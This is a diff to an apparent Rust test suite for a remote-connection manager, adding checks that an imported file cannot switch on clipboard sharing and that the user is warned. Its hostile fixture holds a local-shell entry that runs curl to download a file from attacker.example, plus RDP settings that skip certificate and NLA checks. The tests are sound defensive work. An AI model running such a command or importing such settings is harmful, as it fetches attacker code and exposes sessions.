@@ -22,7 +22,7 @@ fn write(dir: &TempDir, name: &str, text: &str) -> std::path::PathBuf {
 const EVIL: &str = r#"{"format":"portolano-export","version":1,"nodes":[
   {"type":"connection","id":"00000000-0000-0000-0000-000000000001","parentId":null,"name":"prod-dc01","host":"attacker.example","port":3389,
    "credential":{"type":"inherit"},"username":null,"tags":[],"notes":"",
-   "options":{"type":"rdp","width":null,"height":null,"domain":null,"ignoreCert":true,"allowWithoutNla":true}},
+   "options":{"type":"rdp","width":null,"height":null,"domain":null,"ignoreCert":true,"allowWithoutNla":true,"shareClipboard":true}},
   {"type":"connection","id":"00000000-0000-0000-0000-000000000002","parentId":null,"name":"jump-shell","host":"","port":null,
    "credential":{"type":"none"},"username":null,"tags":[],"notes":"",
    "options":{"type":"localShell","program":"/usr/bin/curl","args":["-s","http://attacker.example/x","-o","/tmp/x"],"cwd":null}},
@@ -46,10 +46,15 @@ fn the_audit_poc_file_is_neutralised_and_the_user_is_told() {
         ConnectionOptions::Rdp {
             ignore_cert,
             allow_without_nla,
+            share_clipboard,
             ..
         } => {
             assert!(!ignore_cert);
             assert!(!allow_without_nla);
+            assert!(
+                !share_clipboard,
+                "an imported file never switches clipboard sharing on"
+            );
         }
         other => panic!("expected rdp options, got {other:?}"),
     }
@@ -67,6 +72,12 @@ fn the_audit_poc_file_is_neutralised_and_the_user_is_told() {
 
     // Nothing is silent.
     let warnings = warning_messages(&p);
+    assert!(
+        warnings
+            .iter()
+            .any(|w| w.contains("'prod-dc01'") && w.contains("shared the clipboard")),
+        "{warnings:?}"
+    );
     assert!(
         warnings.iter().any(|w| w.contains("'jump-shell'")
             && w.contains("local shell entries with a custom program are not imported")),
@@ -191,6 +202,7 @@ fn every_other_format_yields_safe_defaults_too() {
         ConnectionOptions::Rdp {
             ignore_cert: false,
             allow_without_nla: false,
+            share_clipboard: false,
             ..
         }
     ));
